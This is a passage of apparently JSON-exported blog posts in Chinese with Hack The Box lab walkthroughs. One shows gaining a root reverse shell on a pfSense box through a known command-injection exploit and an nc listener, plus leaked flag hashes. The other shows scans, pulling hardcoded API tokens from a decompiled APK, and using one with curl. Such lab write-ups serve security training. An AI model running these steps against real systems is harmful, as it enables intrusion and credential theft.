文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Sense- Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Sense","date":"2022-04-07T11:38:36.000Z","updated":"2023-06-13T03:52:07.000Z","comments":true,"path":"2022/04/07/Hackthebox/Easy/Hackthebox-Sense/","link":"","permalink":"http://www.lucifiel.com/2022/04/07/Hackthebox/Easy/Hackthebox-Sense/","excerpt":"","text":"Hackthebox - Sense靶场信息 靶场类型 信息收集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Sense] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.60 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-07 00:43 EDT Nmap scan report for 10.10.10.60 Host is up (0.30s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ 443/tcp open ssl/https? | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Not valid before: 2017-10-14T19:21:35 |_Not valid after: 2023-04-06T19:21:35 |_ssl-date: TLS randomness does not represent time Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: specialized|general purpose Running (JUST GUESSING): Comau embedded (92%), FreeBSD 8.X (85%), OpenBSD 4.X (85%) OS CPE: cpe:/o:freebsd:freebsd:8.1 cpe:/o:openbsd:openbsd:4.3 Aggressive OS guesses: Comau C4G robot control unit (92%), FreeBSD 8.1 (85%), OpenBSD 4.3 (85%), OpenBSD 4.0 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 313.22 ms 10.10.14.1 2 313.26 ms 10.10.10.60 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 65.91 seconds Http 是一台 pfsense，具体的版本不明 测试了一下弱口令，没有成功 去 fuzz 一下 fuzz┌──(root💀kali)-[~/Desktop/HTB/Easy/Sense] └─# gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt -t 200 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://10.10.10.60 [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2022/04/07 16:05:38 Starting gobuster in directory enumeration mode =============================================================== /themes (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/themes/] /css (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/css/] /includes (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/includes/] /javascript (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/javascript/] /changelog.txt (Status: 200) [Size: 271] /classes (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/classes/] /widgets (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/widgets/] /tree (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/tree/] /shortcuts (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/shortcuts/] /installer (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/installer/] /wizards (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/wizards/] /csrf (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/csrf/] /system-users.txt (Status: 200) [Size: 106] /filebrowser (Status: 301) [Size: 0] [--&gt; https://10.10.10.60/filebrowser/] /%7Echeckout%7E (Status: 403) [Size: 345] =============================================================== 2022/04/07 16:12:30 Finished =============================================================== 这里看到有两个 txt 文件，去查看一下 https://10.10.10.60/changelog.txt # Security Changelog ### Issue There was a failure in updating the firewall. Manual patching is therefore required ### Mitigated 2 of 3 vulnerabilities have been patched. ### Timeline The remaining patches will be installed during the next maintenance window https://10.10.10.60/system-users.txt ####Support ticket### Please create the following user username: Rohit password: company defaults 第一个文件说发现了三个漏洞，已经修复了其中两个，那就是还有一个 第二个文件告诉我们有一个账号 Rohit，密码是 pfSense的默认密码 去搜索一下默认密码 得到了一个账户密码 username = rohit password = pfsense 漏洞利用现在去登录 登入后可以看到，当前版本是 pfSense2.1.3 去查找一下是否有漏洞 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Sense] └─# searchsploit pfSense2.1.3 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- pfSense&lt; 2.1.4 - &#39;status_rrd_graph_img.php&#39; Command Injection | php/webapps/43560.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results 还真找到一个 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Sense] └─# locate php/webapps/43560.py /usr/share/exploitdb/exploits/php/webapps/43560.py ┌──(root💀kali)-[~/Desktop/HTB/Easy/Sense] └─# cp /usr/share/exploitdb/exploits/php/webapps/43560.py ./exploit.py 把 exploit 给复制过来 使用 nc 监听一个端口 ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... 然后去执行 exploit ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.10.60] 65102 sh: can&#39;t access tty; job control turned off # whoami&amp;&amp;id root uid=0(root) gid=0(wheel) groups=0(wheel) 成功拿到 root 权限的 shell # cat /home/rohit/user.txt 8721327cc232073b40d27d9c17e7348b # cat /root/root.txt d08c32a5d4f8c8b10e76eb51a69f1a86 拿到 user 权限 和 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Catch - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Catch","date":"2022-04-06T11:38:36.000Z","updated":"2023-06-13T03:42:11.000Z","comments":true,"path":"2022/04/06/Hackthebox/Medium/Hackthebox-Catch/","link":"","permalink":"http://www.lucifiel.com/2022/04/06/Hackthebox/Medium/Hackthebox-Catch/","excerpt":"","text":"Hackthebox - Catch靶场信息 靶场类型 信息搜集NMAP┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.150 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-06 03:34 EDT Nmap scan report for 10.10.11.150 Host is up (0.25s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Catch Global Systems 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/html; charset=UTF-8 | Set-Cookie: i_like_gitea=229c01ff2c679664; Path=/; HttpOnly | Set-Cookie: _csrf=VFIu8a5yLSGnb8AWF33ofFOqRKE6MTY0OTIzMDUyNDYwMDczNjU5MQ; Path=/; Expires=Thu, 07 Apr 2022 07:35:24 GMT; HttpOnly; SameSite=Lax | Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Wed, 06 Apr 2022 07:35:24 GMT | &lt;!DOCTYPE html&gt; | &lt;html lang=&quot;en-US&quot; class=&quot;theme-&quot;&gt; | &lt;head data-suburl=&quot;&quot;&gt; | &lt;meta charset=&quot;utf-8&quot;&gt; | &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; | &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt; | &lt;title&gt; Catch Repositories &lt;/title&gt; | &lt;link rel=&quot;manifest&quot; href=&quot;data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Set-Cookie: i_like_gitea=ada0631c19902f31; Path=/; HttpOnly | Set-Cookie: _csrf=Fjvxg_M7Bc_5OS6o7uXWAaUEJCg6MTY0OTIzMDUzMzM1MTAzMTUxNg; Path=/; Expires=Thu, 07 Apr 2022 07:35:33 GMT; HttpOnly; SameSite=Lax | Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Wed, 06 Apr 2022 07:35:33 GMT |_ Content-Length: 0 5000/tcp open upnp? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 302 Found | X-Frame-Options: SAMEORIGIN | X-Download-Options: noopen | X-Content-Type-Options: nosniff | X-XSS-Protection: 1; mode=block | Content-Security-Policy: | X-Content-Security-Policy: | X-WebKit-CSP: | X-UA-Compatible: IE=Edge,chrome=1 | Location: /login | Vary: Accept, Accept-Encoding | Content-Type: text/plain; charset=utf-8 | Content-Length: 28 | Set-Cookie: connect.sid=s%3AEQngskGgO4I2xPH7SOxj7INNlQZTOA-7.bWQDiu%2BFXvDOHdHW15rgWh4N9jvQ7KAvrpzZQrh4Vvw; Path=/; HttpOnly | Date: Wed, 06 Apr 2022 07:35:28 GMT | Connection: close | Found. Redirecting to /login | HTTPOptions: | HTTP/1.1 200 OK | X-Frame-Options: SAMEORIGIN | X-Download-Options: noopen | X-Content-Type-Options: nosniff | X-XSS-Protection: 1; mode=block | Content-Security-Policy: | X-Content-Security-Policy: | X-WebKit-CSP: | X-UA-Compatible: IE=Edge,chrome=1 | Allow: GET,HEAD | Content-Type: text/html; charset=utf-8 | Content-Length: 8 | ETag: W/&quot;8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg&quot; | Set-Cookie: connect.sid=s%3A-1OGMg8iZf45c1yBQ3QmeijWzg-5hyZy.5H0gXM7aorV%2BeFuutbDUJQn149ThPRcg%2FiKj%2FeVanl0; Path=/; HttpOnly | Vary: Accept-Encoding | Date: Wed, 06 Apr 2022 07:35:31 GMT | Connection: close |_ GET,HEAD 8000/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Catch Global Systems 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port3000-TCP:V=7.91%I=7%D=4/6%Time=624D42BB%P=x86_64-pc-linux-gnu%r(Gen SF:ericLines,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te SF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2 SF:0Request&quot;)%r(GetRequest,14F9,&quot;HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\x SF:20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20i_like_gitea=229c01ff2c SF:679664;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=VFIu8a5yLSGnb8AW SF:F33ofFOqRKE6MTY0OTIzMDUyNDYwMDczNjU5MQ;\\x20Path=/;\\x20Expires=Thu,\\x200 SF:7\\x20Apr\\x202022\\x2007:35:24\\x20GMT;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nSe SF:t-Cookie:\\x20macaron_flash=;\\x20Path=/;\\x20Max-Age=0;\\x20HttpOnly\\r\\nX- SF:Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Wed,\\x2006\\x20Apr\\x202022\\x200 SF:7:35:24\\x20GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\&quot;en-US\\&quot;\\x20cl SF:ass=\\&quot;theme-\\&quot;&gt;\\n&lt;head\\x20data-suburl=\\&quot;\\&quot;&gt;\\n\\t&lt;meta\\x20charset=\\&quot;utf-8 SF:\\&quot;&gt;\\n\\t&lt;meta\\x20name=\\&quot;viewport\\&quot;\\x20content=\\&quot;width=device-width,\\x20i SF:nitial-scale=1\\&quot;&gt;\\n\\t&lt;meta\\x20http-equiv=\\&quot;x-ua-compatible\\&quot;\\x20content SF:=\\&quot;ie=edge\\&quot;&gt;\\n\\t&lt;title&gt;\\x20Catch\\x20Repositories\\x20&lt;/title&gt;\\n\\t&lt;link\\ SF:x20rel=\\&quot;manifest\\&quot;\\x20href=\\&quot;data:application/json;base64,eyJuYW1lIjoi SF:Q2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyI SF:sInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3 SF:sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz&quot;)%r(Help,67,&quot;HTTP/1\\.1\\x2040 SF:0\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\ SF:nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;)%r(HTTPOptions,17F, SF:&quot;HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nSet-Cookie:\\x20i_like_ SF:gitea=ada0631c19902f31;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf= SF:Fjvxg_M7Bc_5OS6o7uXWAaUEJCg6MTY0OTIzMDUzMzM1MTAzMTUxNg;\\x20Path=/;\\x20E SF:xpires=Thu,\\x2007\\x20Apr\\x202022\\x2007:35:33\\x20GMT;\\x20HttpOnly;\\x20Sa SF:meSite=Lax\\r\\nSet-Cookie:\\x20macaron_flash=;\\x20Path=/;\\x20Max-Age=0;\\x SF:20HttpOnly\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Wed,\\x2006\\x20 SF:Apr\\x202022\\x2007:35:33\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(RTSP SF:Request,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text SF:/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20R SF:equest&quot;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port5000-TCP:V=7.91%I=7%D=4/6%Time=624D42C0%P=x86_64-pc-linux-gnu%r(Get SF:Request,23C,&quot;HTTP/1\\.1\\x20302\\x20Found\\r\\nX-Frame-Options:\\x20SAMEORIGI SF:N\\r\\nX-Download-Options:\\x20noopen\\r\\nX-Content-Type-Options:\\x20nosnif SF:f\\r\\nX-XSS-Protection:\\x201;\\x20mode=block\\r\\nContent-Security-Policy:\\ SF:x20\\r\\nX-Content-Security-Policy:\\x20\\r\\nX-WebKit-CSP:\\x20\\r\\nX-UA-Comp SF:atible:\\x20IE=Edge,chrome=1\\r\\nLocation:\\x20/login\\r\\nVary:\\x20Accept,\\ SF:x20Accept-Encoding\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n SF:Content-Length:\\x2028\\r\\nSet-Cookie:\\x20connect\\.sid=s%3AEQngskGgO4I2xP SF:H7SOxj7INNlQZTOA-7\\.bWQDiu%2BFXvDOHdHW15rgWh4N9jvQ7KAvrpzZQrh4Vvw;\\x20P SF:ath=/;\\x20HttpOnly\\r\\nDate:\\x20Wed,\\x2006\\x20Apr\\x202022\\x2007:35:28\\x2 SF:0GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nFound\\.\\x20Redirecting\\x20to\\x20/lo SF:gin&quot;)%r(RTSPRequest,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnectio SF:n:\\x20close\\r\\n\\r\\n&quot;)%r(DNSVersionBindReqTCP,2F,&quot;HTTP/1\\.1\\x20400\\x20Ba SF:d\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;)%r(SMBProgNeg,2F,&quot;HTTP/1\\ SF:.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;)%r(ZendJav SF:aBridge,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n&quot;)%r(HTTPOptions,247,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Frame-Options: SF:\\x20SAMEORIGIN\\r\\nX-Download-Options:\\x20noopen\\r\\nX-Content-Type-Optio SF:ns:\\x20nosniff\\r\\nX-XSS-Protection:\\x201;\\x20mode=block\\r\\nContent-Secu SF:rity-Policy:\\x20\\r\\nX-Content-Security-Policy:\\x20\\r\\nX-WebKit-CSP:\\x20 SF:\\r\\nX-UA-Compatible:\\x20IE=Edge,chrome=1\\r\\nAllow:\\x20GET,HEAD\\r\\nConte SF:nt-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x208\\r\\nETag SF::\\x20W/\\&quot;8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\\&quot;\\r\\nSet-Cookie:\\x20connect\\.sid SF:=s%3A-1OGMg8iZf45c1yBQ3QmeijWzg-5hyZy\\.5H0gXM7aorV%2BeFuutbDUJQn149ThPR SF:cg%2FiKj%2FeVanl0;\\x20Path=/;\\x20HttpOnly\\r\\nVary:\\x20Accept-Encoding\\r SF:\\nDate:\\x20Wed,\\x2006\\x20Apr\\x202022\\x2007:35:31\\x20GMT\\r\\nConnection:\\ SF:x20close\\r\\n\\r\\nGET,HEAD&quot;)%r(RPCCheck,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Re SF:quest\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;)%r(DNSStatusRequestTCP,2F,&quot;HTTP/ SF:1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;)%r(Help, SF:2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot; SF:); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/6%OT=22%CT=1%CU=30269%PV=Y%DS=2%DC=T%G=Y%TM=624D4342 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=10 OS:5%GCD=3%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3 OS:=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=F OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 110/tcp) HOP RTT ADDRESS 1 276.00 ms 10.10.14.1 2 276.19 ms 10.10.11.150 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 160.41 seconds HTTP80 端口 访问后发现任何页面，除了下载 apk 以外，都无法点。 接着我做了一下 fuzz，也并没有东西，先把 apk 文件下载下来吧，同时去看看其他内容 ┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.11.150/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.150/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ javascript [Status: 301, Size: 317, Words: 20, Lines: 10] server-status [Status: 403, Size: 277, Words: 20, Lines: 10] [Status: 200, Size: 6163, Words: 855, Lines: 375] :: Progress: [20116/20116] :: Job [1/1] :: 112 req/sec :: Duration: [0:02:39] :: Errors: 0 :: 没有内容 5000 端口 5000 端口是一个登陆页面，但是似乎没有账号 ┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.11.150:5000/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.150:5000/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ logout [Status: 302, Size: 28, Words: 4, Lines: 1] media [Status: 301, Size: 177, Words: 7, Lines: 11] login [Status: 200, Size: 2622, Words: 709, Lines: 57] files [Status: 401, Size: 12, Words: 1, Lines: 1] users [Status: 401, Size: 12, Words: 1, Lines: 1] account [Status: 401, Size: 12, Words: 1, Lines: 1] Login [Status: 200, Size: 2622, Words: 709, Lines: 57] Connections [Status: 401, Size: 12, Words: 1, Lines: 1] connections [Status: 401, Size: 12, Words: 1, Lines: 1] Files [Status: 401, Size: 12, Words: 1, Lines: 1] messages [Status: 401, Size: 12, Words: 1, Lines: 1] Account [Status: 401, Size: 12, Words: 1, Lines: 1] Media [Status: 301, Size: 177, Words: 7, Lines: 11] Users [Status: 401, Size: 12, Words: 1, Lines: 1] FILES [Status: 401, Size: 12, Words: 1, Lines: 1] Logout [Status: 302, Size: 28, Words: 4, Lines: 1] Messages [Status: 401, Size: 12, Words: 1, Lines: 1] [Status: 302, Size: 28, Words: 4, Lines: 1] rooms [Status: 401, Size: 12, Words: 1, Lines: 1] MEDIA [Status: 301, Size: 177, Words: 7, Lines: 11] CONNECTIONS [Status: 401, Size: 12, Words: 1, Lines: 1] LOGIN [Status: 200, Size: 2627, Words: 709, Lines: 57] :: Progress: [20116/20116] :: Job [1/1] :: 77 req/sec :: Duration: [0:05:20] :: Errors: 0 :: 东西还挺多，去看一下 提示 Unauthorized 没有令牌嘛，毕竟没有登陆 8000 端口 似乎是一个系统运行监控的，然后点击下面的仪表盘会进入一个登录页面 试了几个弱口令都无法进去，去看看 apk 文件吧 ┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.11.150:8000/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.150:8000/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ admin [Status: 302, Size: 386, Words: 60, Lines: 12] img [Status: 301, Size: 317, Words: 20, Lines: 10] fonts [Status: 301, Size: 319, Words: 20, Lines: 10] setup [Status: 302, Size: 382, Words: 60, Lines: 12] dashboard [Status: 302, Size: 386, Words: 60, Lines: 12] storage [Status: 403, Size: 279, Words: 20, Lines: 10] dist [Status: 301, Size: 318, Words: 20, Lines: 10] server-status [Status: 403, Size: 279, Words: 20, Lines: 10] [Status: 200, Size: 8870, Words: 1951, Lines: 302] :: Progress: [20116/20116] :: Job [1/1] :: 70 req/sec :: Duration: [0:05:55] :: Errors: 0 :: 也没啥可看的东西 Apk使用 apktool 进行反编译 ┌──(root💀kali)-[~/Desktop/catch] └─# apktool d catchv1.0.apk Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true I: Using Apktool 2.5.0-dirty on catchv1.0.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: /root/.local/share/apktool/framework/1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... 然后查找一下 token ┌──(root💀kali)-[~/Desktop/catch] └─# grep -rn token catchv1.0/res/values/strings.xml 43: &lt;string name=&quot;gitea_token&quot;&gt;b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0&lt;/string&gt; 47: &lt;string name=&quot;lets_chat_token&quot;&gt;NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&lt;/string&gt; 104: &lt;string name=&quot;slack_token&quot;&gt;xoxp-23984754863-2348975623103&lt;/string&gt; 在 /catchv1.0/res/values/string.xml 下的第 47 行有一个 lets_chat_token ，应该就是这个了，来利用一下吧 漏洞利用使用令牌授权进行读取 ┌──(root💀kali)-[~/Desktop] └─# curl -H &#39;Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&#39; &#39;http://10.10.11.150:5000/rooms&#39; [{&quot;id&quot;:&quot;61b86b28d984e2451036eb17&quot;,&quot;slug&quot;:&quot;status&quot;,&quot;name&quot;:&quot;Status&quot;,&quot;description&quot;:&quot;Cachet Updates and Maintenance&quot;,&quot;lastActive&quot;:&quot;2021-12-14T10:34:20.749Z&quot;,&quot;created&quot;:&quot;2021-12-14T10:00:08.384Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;private&quot;:false,&quot;hasPassword&quot;:false,&quot;participants&quot;:[]},{&quot;id&quot;:&quot;61b8708efe190b466d476bfb&quot;,&quot;slug&quot;:&quot;android_dev&quot;,&quot;name&quot;:&quot;Android Development&quot;,&quot;description&quot;:&quot;Android App Updates, Issues &amp; More&quot;,&quot;lastActive&quot;:&quot;2021-12-14T10:24:21.145Z&quot;,&quot;created&quot;:&quot;2021-12-14T10:23:10.474Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;private&quot;:false,&quot;hasPassword&quot;:false,&quot;participants&quot;:[]},{&quot;id&quot;:&quot;61b86b3fd984e2451036eb18&quot;,&quot;slug&quot;:&quot;employees&quot;,&quot;name&quot;:&quot;Employees&quot;,&quot;description&quot;:&quot;New Joinees, Org 